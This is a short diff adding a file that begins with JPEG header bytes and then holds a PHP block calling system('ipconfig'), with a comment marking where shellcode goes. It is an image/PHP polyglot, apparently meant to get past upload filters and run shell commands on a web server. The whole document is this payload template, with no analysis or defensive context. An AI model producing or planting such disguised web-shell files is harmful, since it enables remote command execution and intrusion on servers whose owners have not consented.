@@ -1,0 +1,4 @@
+ÿØÿà9a;
+<?php
+system('ipconfig'); # shellcode goes here
+?>
